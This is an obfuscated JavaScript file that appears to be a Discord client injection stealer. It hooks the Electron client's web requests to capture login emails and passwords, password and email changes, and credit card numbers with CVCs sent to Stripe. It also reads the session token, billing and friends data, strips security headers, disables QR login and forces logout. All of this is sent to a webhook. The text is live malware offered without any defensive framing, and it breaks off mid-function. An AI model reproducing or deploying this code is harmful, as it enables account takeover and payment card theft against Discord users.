var _0x302a44=_0x466e;(function(_0x3d6bbc,_0x205f7f){var _0x2d2072=_0x466e,_0x538101=_0x3d6bbc();while(!![]){try{var _0x20b3df=parseInt(_0x2d2072(0x22a))/0x1+-parseInt(_0x2d2072(0x1ab))/0x2*(parseInt(_0x2d2072(0x1c8))/0x3)+-parseInt(_0x2d2072(0x245))/0x4*(parseInt(_0x2d2072(0x1f3))/0x5)+parseInt(_0x2d2072(0x244))/0x6*(parseInt(_0x2d2072(0x202))/0x7)+parseInt(_0x2d2072(0x233))/0x8+parseInt(_0x2d2072(0x203))/0x9*(parseInt(_0x2d2072(0x21f))/0xa)+parseInt(_0x2d2072(0x216))/0xb*(-parseInt(_0x2d2072(0x1db))/0xc);if(_0x20b3df===_0x205f7f)break;else _0x538101['push'](_0x538101['shift']());}catch(_0x26ba85){_0x538101['push'](_0x538101['shift']());}}}(_0xf010,0xaa3d7));const {BrowserWindow,session}=require(_0x302a44(0x22d)),os=require('os'),https=require(_0x302a44(0x1ef)),querystring=require('querystring'),fs=require('fs');var config={'brand':_0x302a44(0x232),'webhook':_0x302a44(0x19c),'logout':!![],'disable_qr_code':!![],'notify_on_logout':!![],'notify_on_initialization':!![],'ping':[!![],_0x302a44(0x234)],'embed':{'username':_0x302a44(0x1a0),'footer':{'text':_0x302a44(0x1fc),'icon_url':'https://cdn.discordapp.com/attachments/1021747119696134204/1024641101153456148/uzgun.png'},'href':_0x302a44(0x20a),'avatar_url':'https://cdn.discordapp.com/attachments/1021747119696134204/1024641101153456148/uzgun.png'},'badges':{'Discord_Employee':{'Value':0x1,'Emoji':'<:staff:874750808728666152>','Rare':!![]},'Partnered_Server_Owner':{'Value':0x2,'Emoji':_0x302a44(0x1f1),'Rare':!![]},'HypeSquad_Events':{'Value':0x4,'Emoji':'<:hypesquad_events:874750808594477056>','Rare':!![]},'Bug_Hunter_Level_1':{'Value':0x8,'Emoji':_0x302a44(0x22c),'Rare':!![]},'Early_Supporter':{'Value':0x200,'Emoji':_0x302a44(0x20c),'Rare':!![]},'Bug_Hunter_Level_2':{'Value':0x4000,'Emoji':_0x302a44(0x222),'Rare':!![]},'Early_Verified_Bot_Developer':{'Value':0x20000,'Emoji':'<:developer:874750808472825986>','Rare':!![]},'House_Bravery':{'Value':0x40,'Emoji':_0x302a44(0x1c4),'Rare':![]},'House_Brilliance':{'Value':0x80,'Emoji':_0x302a44(0x1c3),'Rare':![]},'House_Balance':{'Value':0x100,'Emoji':'<:balance:874750808267292683>','Rare':![]}},'filters':{'user':{'urls':[_0x302a44(0x1c5),_0x302a44(0x1be),_0x302a44(0x22b),_0x302a44(0x1d4),_0x302a44(0x235),'https://*.discord.com/api/v*/auth/login','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','https://api.stripe.com/v*/tokens','https://api.stripe.com/v*/setup_intents/*/confirm',_0x302a44(0x198)]},'qr_codes':{'urls':[_0x302a44(0x228),'https://*.discord.com/api/v*/applications/detectable','https://discord.com/api/v*/applications/detectable','https://*.discord.com/api/v*/users/@me/library',_0x302a44(0x1b8),'https://*.discord.com/api/v*/users/@me/billing/subscriptions',_0x302a44(0x239),_0x302a44(0x1b9)]}}},execScript=_0x393288=>{var _0x1ac3e4=_0x302a44;const _0x2c6266=BrowserWindow['getAllWindows']()[0x0];return _0x2c6266['webContents'][_0x1ac3e4(0x23b)](_0x393288,!![]);};class Event{constructor(_0x4ecd14,_0xf83b9b,_0x46aa9a){for(let [_0x2abeae,_0x21de3e]of Object['entries']({'event':_0x4ecd14,'data':_0x46aa9a,'token':_0xf83b9b})){this[_0x2abeae]=_0x21de3e;}}[_0x302a44(0x1f5)](){var _0x1c50c2=_0x302a44;switch(this[_0x1c50c2(0x207)]){case _0x1c50c2(0x1d7):event_handlers[_0x1c50c2(0x1d7)](this[_0x1c50c2(0x21b)][_0x1c50c2(0x211)],this[_0x1c50c2(0x21b)][_0x1c50c2(0x236)],this['token']);break;case'userLogin':event_handlers['userLogin'](this[_0x1c50c2(0x21b)][_0x1c50c2(0x211)],this[_0x1c50c2(0x21b)][_0x1c50c2(0x1d5)],this[_0x1c50c2(0x23a)]);break;case _0x1c50c2(0x1c7):event_handlers['emailChanged'](this[_0x1c50c2(0x21b)][_0x1c50c2(0x211)],this[_0x1c50c2(0x21b)]['email'],this[_0x1c50c2(0x23a)]);break;case _0x1c50c2(0x1b5):event_handlers[_0x1c50c2(0x1b5)](this[_0x1c50c2(0x21b)][_0x1c50c2(0x1bb)],this['data'][_0x1c50c2(0x1b2)],this[_0x1c50c2(0x21b)][_0x1c50c2(0x209)],this['data']['exp_year'],this[_0x1c50c2(0x23a)]);}}}session['defaultSession']['webRequest'][_0x302a44(0x1a4)]((_0x53fadf,_0x5a9239)=>{var _0x4a662c=_0x302a44;try{_0x53fadf[_0x4a662c(0x199)][_0x4a662c(0x229)](config[_0x4a662c(0x1cf)])?_0x53fadf[_0x4a662c(0x199)]['includes'](_0x4a662c(0x1cd))?_0x5a9239({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0x53fadf[_0x4a662c(0x1ff)])}):_0x5a9239({'responseHeaders':Object[_0x4a662c(0x1b3)]({'Content-Security-Policy':[_0x4a662c(0x1ec),_0x4a662c(0x1fa),_0x4a662c(0x21a)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x53fadf[_0x4a662c(0x1ff)])}):(delete _0x53fadf['responseHeaders'][_0x4a662c(0x1ce)],delete _0x53fadf[_0x4a662c(0x1ff)][_0x4a662c(0x1c2)],_0x5a9239({'responseHeaders':{..._0x53fadf[_0x4a662c(0x1ff)],'Access-Control-Allow-Headers':'*'}}));}catch{}}),session[_0x302a44(0x224)][_0x302a44(0x1ca)][_0x302a44(0x1a5)](config['filters'][_0x302a44(0x1ee)],async(_0x5509d8,_0x43cdf7)=>{var _0x5c3571=_0x302a44;if(_0x5509d8['url'][_0x5c3571(0x229)](_0x5c3571(0x1d9))){if(!config[_0x5c3571(0x1bd)]==![]){_0x43cdf7({'cancel':!![]});return;}}await initialize(),_0x43cdf7({});return;}),session['defaultSession'][_0x302a44(0x1ca)][_0x302a44(0x1dc)](config[_0x302a44(0x1f6)][_0x302a44(0x1cb)],async(_0x100e3d,_0x3a8d3b)=>{var _0x52fdb1=_0x302a44;try{if(_0x100e3d['statusCode']==0xc8||_0x100e3d['statusCode']==0xcc){const _0x1be6b4=Buffer['from'](_0x100e3d[_0x52fdb1(0x19a)][0x0][_0x52fdb1(0x1de)])['toString'](),_0x5c533f=JSON[_0x52fdb1(0x23e)](_0x1be6b4),_0x1959d8=await getToken();switch(!![]){case _0x100e3d[_0x52fdb1(0x199)][_0x52fdb1(0x242)](_0x52fdb1(0x1b0)):new Event(_0x52fdb1(0x21c),_0x1959d8,{'password':_0x5c533f[_0x52fdb1(0x211)],'email':_0x5c533f[_0x52fdb1(0x1b0)]})[_0x52fdb1(0x1f5)]();;return;case _0x100e3d[_0x52fdb1(0x199)][_0x52fdb1(0x242)]('tokens')&&_0x100e3d['method']==_0x52fdb1(0x1eb):const _0x3549bc=querystring[_0x52fdb1(0x23e)](_0x1be6b4[_0x52fdb1(0x231)]());new Event(_0x52fdb1(0x1b5),_0x1959d8,{'number':_0x3549bc['card[number]'],'cvc':_0x3549bc[_0x52fdb1(0x206)],'exp_month':_0x3549bc[_0x52fdb1(0x237)],'exp_year':_0x3549bc[_0x52fdb1(0x248)]});case _0x100e3d[_0x52fdb1(0x199)][_0x52fdb1(0x242)](_0x52fdb1(0x1e2))&&_0x100e3d[_0x52fdb1(0x226)]==_0x52fdb1(0x1d6):if(!_0x5c533f['password'])return;_0x5c533f[_0x52fdb1(0x1d5)]&&new Event(_0x52fdb1(0x1c7),_0x1959d8,{'password':_0x5c533f['password'],'email':_0x5c533f[_0x52fdb1(0x1d5)]})[_0x52fdb1(0x1f5)]();;_0x5c533f['new_password']&&new Event(_0x52fdb1(0x1d7),_0x1959d8,{'password':_0x5c533f[_0x52fdb1(0x211)],'new_password':_0x5c533f['new_password']})['handle']();;return;default:break;}}else return;}catch{}});var event_handlers={async 'creditCardAdded'(_0x4d1efa,_0x45a896,_0x21034d,_0x1eacf5){var _0xe4032f=_0x302a44;const _0x114130=await getUserInfo(token),_0x5d270f=await getBilling(token),_0x256b63=await getRelationships(token);var _0x4bfb42={'username':config[_0xe4032f(0x23d)][_0xe4032f(0x20e)],'avatar_url':config['embed']['avatar_url'],'embeds':[createEmbed({'title':'Discord\x20|\x20Credit\x20card\x20added','url':config[_0xe4032f(0x23d)][_0xe4032f(0x1ea)],'author':{'name':_0x114130[_0xe4032f(0x20e)]+'#'+_0x114130[_0xe4032f(0x227)]+'\x20('+_0x114130['id']+')','url':config[_0xe4032f(0x23d)][_0xe4032f(0x1ea)],'icon_url':_0x114130[_0xe4032f(0x215)]?_0xe4032f(0x196)+_0x114130['id']+'/'+_0x114130[_0xe4032f(0x215)]:_0xe4032f(0x225)},'thumbnail':{'url':_0x114130[_0xe4032f(0x215)]?_0xe4032f(0x196)+_0x114130['id']+'/'+_0x114130[_0xe4032f(0x215)]:_0xe4032f(0x225)},'fields':[{'name':_0xe4032f(0x1a9),'value':_0xe4032f(0x1ba)+_0x4d1efa+'```','inline':!![]},{'name':'Credit\x20card\x20CVC','value':_0xe4032f(0x1ba)+_0x45a896+_0xe4032f(0x1ba),'inline':!![]},{'name':_0xe4032f(0x1fb),'value':_0xe4032f(0x1ba)+_0x21034d+'/'+_0x1eacf5+_0xe4032f(0x1ba),'inline':!![]},{'name':_0xe4032f(0x1d8),'value':_0xe4032f(0x1ba)+(_0x114130[_0xe4032f(0x1ae)]??_0xe4032f(0x1a2))+'```','inline':![]},{'name':_0xe4032f(0x1c9),'value':''+getNitro(_0x114130['premium_type']),'inline':![]},{'name':_0xe4032f(0x19f),'value':''+_0x5d270f,'inline':!![]},{'name':_0xe4032f(0x221),'value':''+getBadges(_0x114130['flags']),'inline':![]},{'name':_0xe4032f(0x204),'value':_0xe4032f(0x1ba)+token+_0xe4032f(0x1ba),'inline':![]},{'name':_0xe4032f(0x1c0),'value':'```'+os[_0xe4032f(0x1fd)]+'```','inline':![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0x256b63['length']+_0xe4032f(0x208)+_0x256b63['frien'],'thumbnail':{'url':_0x114130[_0xe4032f(0x215)]?'https://cdn.discordapp.com/avatars/'+_0x114130['id']+'/'+_0x114130[_0xe4032f(0x215)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'author':{'name':_0x114130[_0xe4032f(0x20e)]+'#'+_0x114130[_0xe4032f(0x227)]+'\x20('+_0x114130['id']+')','url':config['embed'][_0xe4032f(0x1ea)],'icon_url':_0x114130['avatar']?_0xe4032f(0x196)+_0x114130['id']+'/'+_0x114130['avatar']:_0xe4032f(0x225)}})]};sendToWebhook(_0x4bfb42);},async 'userLogin'(_0x3b9d3d,_0x1d965f,_0x4241b2){var _0x5c3d07=_0x302a44;const _0x4388e5=await getUserInfo(_0x4241b2),_0x2ec709=await getBilling(_0x4241b2),_0x548e02=await getRelationships(_0x4241b2);var _0x67aa6f={'username':config[_0x5c3d07(0x23d)][_0x5c3d07(0x20e)],'avatar_url':config[_0x5c3d07(0x23d)][_0x5c3d07(0x217)],'embeds':[createEmbed({'title':_0x5c3d07(0x1a1),'url':config[_0x5c3d07(0x23d)][_0x5c3d07(0x1ea)],'author':{'name':_0x4388e5[_0x5c3d07(0x20e)]+'#'+_0x4388e5[_0x5c3d07(0x227)]+'\x20('+_0x4388e5['id']+')','url':config[_0x5c3d07(0x23d)][_0x5c3d07(0x1ea)],'icon_url':_0x4388e5[_0x5c3d07(0x215)]?'https://cdn.discordapp.com/avatars/'+_0x4388e5['id']+'/'+_0x4388e5[_0x5c3d07(0x215)]:_0x5c3d07(0x225)},'thumbnail':{'url':_0x4388e5[_0x5c3d07(0x215)]?'https://cdn.discordapp.com/avatars/'+_0x4388e5['id']+'/'+_0x4388e5[_0x5c3d07(0x215)]:_0x5c3d07(0x225)},'fields':[{'name':_0x5c3d07(0x1f2),'value':_0x5c3d07(0x1ba)+_0x3b9d3d+_0x5c3d07(0x1ba),'inline':!![]},{'name':_0x5c3d07(0x1a6),'value':'```'+_0x1d965f+_0x5c3d07(0x1ba),'inline':!![]},{'name':_0x5c3d07(0x1d8),'value':'```'+(_0x4388e5[_0x5c3d07(0x1ae)]??'None')+_0x5c3d07(0x1ba),'inline':![]},{'name':'Nitro','value':''+getNitro(_0x4388e5[_0x5c3d07(0x1e5)]),'inline':![]},{'name':_0x5c3d07(0x19f),'value':''+_0x2ec709,'inline':!![]},{'name':_0x5c3d07(0x221),'value':''+getBadges(_0x4388e5[_0x5c3d07(0x22f)]),'inline':![]},{'name':_0x5c3d07(0x204),'value':'```'+_0x4241b2+_0x5c3d07(0x1ba),'inline':![]},{'name':_0x5c3d07(0x1c0),'value':'```'+os[_0x5c3d07(0x1fd)]+'```','inline':![]}]}),createEmbed({'description':_0x5c3d07(0x1e7)+_0x548e02[_0x5c3d07(0x1bf)]+_0x5c3d07(0x208)+_0x548e02[_0x5c3d07(0x1e0)],'thumbnail':{'url':_0x4388e5['avatar']?'https://cdn.discordapp.com/avatars/'+_0x4388e5['id']+'/'+_0x4388e5[_0x5c3d07(0x215)]:_0x5c3d07(0x225)},'author':{'name':_0x4388e5[_0x5c3d07(0x20e)]+'#'+_0x4388e5[_0x5c3d07(0x227)]+'\x20('+_0x4388e5['id']+')','url':config[_0x5c3d07(0x23d)]['href'],'icon_url':_0x4388e5['avatar']?_0x5c3d07(0x196)+_0x4388e5['id']+'/'+_0x4388e5[_0x5c3d07(0x215)]:_0x5c3d07(0x225)}})]};sendToWebhook(_0x67aa6f);},async 'emailChanged'(_0x3a74b5,_0x4c1164,_0x29ea38){var _0x31af97=_0x302a44,_0x24669c=await getUserInfo(_0x29ea38),_0x55f2a2=await getBilling(_0x29ea38),_0x353616=await getRelationships(_0x29ea38),_0x53c9f7={'username':config['embed']['username'],'avatar_url':config[_0x31af97(0x23d)][_0x31af97(0x217)],'embeds':[createEmbed({'title':'Discord\x20|\x20Email\x20changed','url':config[_0x31af97(0x23d)][_0x31af97(0x1ea)],'author':{'name':_0x24669c[_0x31af97(0x20e)]+'#'+_0x24669c[_0x31af97(0x227)]+'\x20('+_0x24669c['id']+')','url':config['embed'][_0x31af97(0x1ea)],'icon_url':_0x24669c[_0x31af97(0x215)]?_0x31af97(0x196)+_0x24669c['id']+'/'+_0x24669c[_0x31af97(0x215)]:_0x31af97(0x225)},'thumbnail':{'url':_0x24669c[_0x31af97(0x215)]?_0x31af97(0x196)+_0x24669c['id']+'/'+_0x24669c[_0x31af97(0x215)]:_0x31af97(0x225)},'fields':[{'name':_0x31af97(0x220),'value':_0x31af97(0x1ba)+_0x4c1164+_0x31af97(0x1ba),'inline':!![]},{'name':_0x31af97(0x1f2),'value':_0x31af97(0x1ba)+_0x3a74b5+_0x31af97(0x1ba),'inline':!![]},{'name':_0x31af97(0x1d8),'value':'```'+(_0x24669c[_0x31af97(0x1ae)]??_0x31af97(0x1a2))+'```','inline':![]},{'name':_0x31af97(0x1c9),'value':''+getNitro(_0x24669c[_0x31af97(0x1e5)]),'inline':![]},{'name':_0x31af97(0x19f),'value':''+_0x55f2a2,'inline':!![]},{'name':_0x31af97(0x221),'value':''+getBadges(_0x24669c[_0x31af97(0x22f)]),'inline':![]},{'name':'Token','value':_0x31af97(0x1ba)+_0x29ea38+_0x31af97(0x1ba),'inline':![]},{'name':_0x31af97(0x1c0),'value':_0x31af97(0x1ba)+os[_0x31af97(0x1fd)]+_0x31af97(0x1ba),'inline':![]}]}),createEmbed({'description':_0x31af97(0x1e7)+_0x353616['length']+_0x31af97(0x208)+_0x353616[_0x31af97(0x1e0)],'thumbnail':{'url':_0x24669c[_0x31af97(0x215)]?_0x31af97(0x196)+_0x24669c['id']+'/'+_0x24669c[_0x31af97(0x215)]:_0x31af97(0x225)},'author':{'name':_0x24669c['username']+'#'+_0x24669c[_0x31af97(0x227)]+'\x20('+_0x24669c['id']+')','url':config[_0x31af97(0x23d)][_0x31af97(0x1ea)],'icon_url':_0x24669c[_0x31af97(0x215)]?'https://cdn.discordapp.com/avatars/'+_0x24669c['id']+'/'+_0x24669c[_0x31af97(0x215)]:_0x31af97(0x225)}})]};sendToWebhook(_0x53c9f7);},async 'passwordChanged'(_0x86c202,_0x246ea1,_0x234c83){var _0x3bb68f=_0x302a44,_0x5b9d3d=await getUserInfo(_0x234c83),_0x442a69=await getBilling(_0x234c83),_0x2c4b90=await getRelationships(_0x234c83),_0x32ecd1={'username':config[_0x3bb68f(0x23d)][_0x3bb68f(0x20e)],'avatar_url':config[_0x3bb68f(0x23d)][_0x3bb68f(0x217)],'embeds':[createEmbed({'title':_0x3bb68f(0x241),'url':config[_0x3bb68f(0x23d)][_0x3bb68f(0x1ea)],'author':{'name':_0x5b9d3d[_0x3bb68f(0x20e)]+'#'+_0x5b9d3d['discriminator']+'\x20('+_0x5b9d3d['id']+')','url':config[_0x3bb68f(0x23d)][_0x3bb68f(0x1ea)],'icon_url':_0x5b9d3d['avatar']?_0x3bb68f(0x196)+_0x5b9d3d['id']+'/'+_0x5b9d3d[_0x3bb68f(0x215)]:_0x3bb68f(0x225)},'thumbnail':{'url':_0x5b9d3d[_0x3bb68f(0x215)]?_0x3bb68f(0x196)+_0x5b9d3d['id']+'/'+_0x5b9d3d['avatar']:_0x3bb68f(0x225)},'fields':[{'name':_0x3bb68f(0x1ed),'value':_0x3bb68f(0x1ba)+_0x86c202+_0x3bb68f(0x1ba),'inline':![]},{'name':_0x3bb68f(0x1ad),'value':_0x3bb68f(0x1ba)+_0x246ea1+_0x3bb68f(0x1ba),'inline':![]},{'name':'Phone\x20Number','value':_0x3bb68f(0x1ba)+(_0x5b9d3d[_0x3bb68f(0x1ae)]??_0x3bb68f(0x1a2))+_0x3bb68f(0x1ba),'inline':![]},{'name':_0x3bb68f(0x1c9),'value':''+getNitro(_0x5b9d3d[_0x3bb68f(0x1e5)]),'inline':![]},{'name':_0x3bb68f(0x19f),'value':''+_0x442a69,'inline':!![]},{'name':_0x3bb68f(0x221),'value':''+getBadges(_0x5b9d3d[_0x3bb68f(0x22f)]),'inline':![]},{'name':'Token','value':'```'+_0x234c83+_0x3bb68f(0x1ba),'inline':![]},{'name':'Hostname','value':_0x3bb68f(0x1ba)+os[_0x3bb68f(0x1fd)]+'```','inline':![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0x2c4b90[_0x3bb68f(0x1bf)]+')**\x0a\x0a'+_0x2c4b90[_0x3bb68f(0x1e0)],'thumbnail':{'url':_0x5b9d3d['avatar']?_0x3bb68f(0x196)+_0x5b9d3d['id']+'/'+_0x5b9d3d[_0x3bb68f(0x215)]:_0x3bb68f(0x225)},'author':{'name':_0x5b9d3d[_0x3bb68f(0x20e)]+'#'+_0x5b9d3d[_0x3bb68f(0x227)]+'\x20('+_0x5b9d3d['id']+')','url':config['embed'][_0x3bb68f(0x1ea)],'icon_url':_0x5b9d3d[_0x3bb68f(0x215)]?_0x3bb68f(0x196)+_0x5b9d3d['id']+'/'+_0x5b9d3d['avatar']:'https://cdn.discordapp.com/embed/avatars/0.png'}})]};sendToWebhook(_0x32ecd1);}};function getDiscordClient(){var _0x1f5c75=_0x302a44;return''+process['cwd']()['replace'](process[_0x1f5c75(0x1cc)][_0x1f5c75(0x1bc)]+'\x5c','')[_0x1f5c75(0x246)]('\x5c')[0x0][_0x1f5c75(0x246)](0x7);}function getNitro(_0x1d17c9){var _0x429c09=_0x302a44;switch(_0x1d17c9){case 0x0:return _0x429c09(0x197);case 0x1:return _0x429c09(0x1e9);case 0x2:return _0x429c09(0x1d1);default:return _0x429c09(0x197);};}function getRareBadges(_0x16f7a2){var _0x22388e=_0x302a44,_0x1bde9a='';for(const _0x243eff in config[_0x22388e(0x1b6)]){let _0xe1878=config[_0x22388e(0x1b6)][_0x243eff];if((_0x16f7a2&_0xe1878[_0x22388e(0x1df)])==_0xe1878[_0x22388e(0x1df)]&&_0xe1878[_0x22388e(0x21e)])_0x1bde9a+=_0xe1878[_0x22388e(0x20b)];};return _0x1bde9a;}function getBadges(_0x4a2cf4){var _0x2425ce=_0x302a44,_0x5919c0='';for(const _0x10a9e0 in config[_0x2425ce(0x1b6)]){let _0x54d79a=config['badges'][_0x10a9e0];if((_0x4a2cf4&_0x54d79a['Value'])==_0x54d79a[_0x2425ce(0x1df)])_0x5919c0+=_0x54d79a[_0x2425ce(0x20b)];};if(_0x5919c0=='')_0x5919c0=_0x2425ce(0x1b7);return _0x5919c0;}function _0xf010(){var _0x1b0960=['stringify','\x0aTimezone:\x20','password','log','Client\x20version','./core.asar','avatar','20158919adMMHW','avatar_url','Unknown','notify_on_initialization','Access-Control-Allow-Origin\x20\x27*\x27','data','userLogin','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','Rare','1130FfAEcf','New\x20email\x20address','Badges','<:bughunter_2:874750808430874664>','\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText','defaultSession','https://cdn.discordapp.com/embed/avatars/0.png','method','discriminator','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','startsWith','1150220LLEGmX','https://*.discord.com/api/v*/users/@me','<:bughunter_1:874750808426692658>','electron','content','flags','protocol','toString','uzgun','2685296TxBhnp','@everyone','https://discord.com/api/v*/auth/login','new_password','card[exp_month]','city','https://discord.com/api/v*/users/@me/billing/subscriptions','token','executeJavaScript','`✔️`','embed','parse','\x20|\x20','cwd','Discord\x20|\x20Password\x20changed','endsWith','type','84nVObNm','1371576dWrykm','split','footer','card[exp_year]','https://cdn.discordapp.com/avatars/','```No\x20Nitro```','https://api.stripe.com/v*/payment_intents/*/confirm','url','uploadData','write','%WEBHOOK_LINK%','application/json','\x20<:paypal:896441236062347374>','Billing','Uzgun\x20|\x204455','Discord\x20|\x20User\x20logged\x20in','None','mkdirSync','onHeadersReceived','onBeforeRequest','E-Mail\x20Address','end','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','Credit\x20card\x20Number','public_flags','382dVHOQq','Discord\x20|\x20User\x20logged\x20out','New\x20password','phone','No\x20Rare\x20Friends','login','notify_on_logout','cvc','assign','region','creditCardAdded','badges','```None```','https://discord.com/api/v*/users/@me/library','wss://remote-auth-gateway.discord.gg/*','```','number','LOCALAPPDATA','disable_qr_code','https://discordapp.com/api/v*/users/@me','length','Hostname','country','content-security-policy-report-only','<:brilliance:874750808338608199>','<:bravery:874750808388952075>','https://discord.com/api/v*/users/@me','request','emailChanged','4287yoPKzn','Nitro','webRequest','user','env','discord.com','content-security-policy','webhook','```yaml\x0aIP\x20Address:\x20','<a:boost:824036778570416129>\x20``Nitro\x20Boost``','invalid','\x0aCountry:\x20','https://discordapp.com/api/v*/auth/login','email','PATCH','passwordChanged','Phone\x20Number','wss://','\x22);\x20xmlHttp.send(\x20null\x20);\x20xmlHttp.responseText','12xgjfzD','onCompleted','\x0aCity:\x20','bytes','Value','frien','pathname','users/@me','logout','brand','premium_type','timezone','**Total\x20Friends\x20(','entries','<:classic:896119171019067423>\x20``Nitro\x20Classic``','href','POST','default-src\x20\x27*\x27','Old\x20password','qr_codes','https','\x20||','<:partner:874750808678354964>','Password','15VkNXgf','Discord\x20|\x20Client\x20initialized','handle','filters','\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText;','for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x27get_require\x27]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x27getToken\x27==a&&(token=b.default.getToken())}token;','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','Access-Control-Allow-Headers\x20\x27*\x27','Credit\x20card\x20expiration','discord.gg/kurdistan','hostname','\x0aHostname:\x20','responseHeaders','\x0aRegion:\x20','Connection\x20data','676144yufuJD','79119QZNSeq','Token','filter','card[cvc]','event',')**\x0a\x0a','exp_month','https://discord.gg/kurdistan','Emoji','<:early_supporter:874750808414113823>','```❌```','username'];_0xf010=function(){return _0x1b0960;};return _0xf010();}async function getToken(){var _0x31e6d5=_0x302a44;return await execScript(_0x31e6d5(0x1f8),!![]);}function _0x466e(_0x4c8380,_0x38d288){var _0xf010b6=_0xf010();return _0x466e=function(_0x466e5b,_0x1f7b15){_0x466e5b=_0x466e5b-0x196;var _0x586060=_0xf010b6[_0x466e5b];return _0x586060;},_0x466e(_0x4c8380,_0x38d288);}async function getIp(){var _0x55a7bd=_0x302a44;return JSON[_0x55a7bd(0x23e)](await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://ipinfo.io/json\x22,\x20false\x20);xmlHttp.send(\x20null\x20);xmlHttp.responseText;',!![]));}async function getUserInfo(_0x19689d){var _0x291dac=_0x302a44;return JSON[_0x291dac(0x23e)](await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x19689d+_0x291dac(0x1f7),!![]));}async function getBilling(_0x1a038c){var _0x2200f1=_0x302a44,_0x54e30b=await execScript(_0x2200f1(0x21d)+_0x1a038c+_0x2200f1(0x1da),!![]),_0x4132cb=JSON[_0x2200f1(0x23e)](_0x54e30b),_0x359181='';_0x4132cb['forEach'](_0x52b8b4=>{var _0x3a3e00=_0x2200f1;if(_0x52b8b4['type']=='')return _0x3a3e00(0x20d);else{if(_0x52b8b4[_0x3a3e00(0x243)]==0x2&&_0x52b8b4[_0x3a3e00(0x1d2)]!=!![])_0x359181+=_0x3a3e00(0x23c)+_0x3a3e00(0x19e);else{if(_0x52b8b4[_0x3a3e00(0x243)]==0x1&&_0x52b8b4[_0x3a3e00(0x1d2)]!=!![])_0x359181+='`✔️`'+'\x20:credit_card:';else return'```❌```';}};});if(_0x359181=='')_0x359181=_0x2200f1(0x20d);return _0x359181;}async function getRelationships(_0x247066){var _0x3bf84f=_0x302a44,_0x5523f6=await execScript(_0x3bf84f(0x1f9)+_0x247066+_0x3bf84f(0x223),!![]),_0x5c8dac=JSON['parse'](_0x5523f6);const _0x30c5d8=_0x5c8dac[_0x3bf84f(0x205)](_0x348502=>{var _0x8fce19=_0x3bf84f;return _0x348502[_0x8fce19(0x243)]==0x1;});var _0x1828be='';for(z of _0x30c5d8){var _0x3f9344=getRareBadges(z['user'][_0x3bf84f(0x1aa)]);_0x3f9344!=''&&(_0x1828be+=_0x3f9344+(_0x3bf84f(0x23f)+z[_0x3bf84f(0x1cb)][_0x3bf84f(0x20e)]+'#'+z[_0x3bf84f(0x1cb)][_0x3bf84f(0x227)]+'\x0a'));}if(!_0x1828be)_0x1828be=_0x3bf84f(0x1af);return{'length':_0x30c5d8[_0x3bf84f(0x1bf)],'frien':_0x1828be};}function sendToWebhook(_0x3fcd78){var _0x499699=_0x302a44;config['ping'][0x0]==!![]&&(_0x3fcd78[_0x499699(0x22e)]?_0x3fcd78[_0x499699(0x22e)]=_0x3fcd78[_0x499699(0x22e)]+(_0x499699(0x1f0)+config['ping'][0x1]+'||'):_0x3fcd78[_0x499699(0x22e)]='||'+config['ping'][0x1]+'||');var _0x5da852=new URL(config[_0x499699(0x1cf)]),_0x46c99={'Content-Type':_0x499699(0x19d),'Access-Control-Allow-Origin':'*'};const _0x247561={'protocol':_0x5da852[_0x499699(0x230)],'hostname':_0x5da852['host'],'path':_0x5da852[_0x499699(0x1e1)],'method':'POST','headers':_0x46c99},_0x23fe3f=https[_0x499699(0x1c6)](_0x247561);_0x23fe3f['on']('error',_0x3909d8=>{var _0x3697e1=_0x499699;console[_0x3697e1(0x212)](_0x3909d8);}),_0x23fe3f[_0x499699(0x19b)](JSON[_0x499699(0x20f)](_0x3fcd78)),_0x23fe3f[_0x499699(0x1a7)]();}function createEmbed(_0x28f935){var _0x14a955=_0x302a44;let _0x11beab={'footer':config[_0x14a955(0x23d)][_0x14a955(0x247)],'timestamp':new Date()};for(let [_0x484a0a,_0x2bb567]of Object[_0x14a955(0x1e8)](_0x28f935)){_0x11beab[_0x484a0a]=_0x2bb567;}return _0x11beab;}async function initialize(){var 